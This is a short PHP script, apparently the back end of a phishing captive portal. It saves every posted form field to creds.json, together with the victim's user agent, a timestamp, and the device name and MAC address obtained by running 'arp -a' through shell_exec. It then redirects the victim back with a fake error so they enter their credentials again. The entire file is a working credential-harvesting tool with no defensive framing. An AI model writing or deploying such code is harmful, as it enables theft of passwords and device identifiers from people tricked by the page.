<?php
if (!empty($_POST)) {
        $credentials = file_get_contents('creds.json');
        $array = json_decode($credentials);
        $_POST['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $_POST['device_name'] = trim(preg_replace('/\s+/', ' ', shell_exec("arp -a ".$_SERVER['REMOTE_ADDR']." | awk '{ print $1 }'")));
        $_POST['mac_address'] = trim(preg_replace('/\s+/', ' ', shell_exec("arp -a ".$_SERVER['REMOTE_ADDR']." | awk '{ print $4 }'")));
        $_POST['timestamp'] = time();
        $array[] = $_POST;
        file_put_contents('creds.json', json_encode($array));
        header("Location: ".$_SERVER['HTTP_REFERER']."?error=1");
}
?>
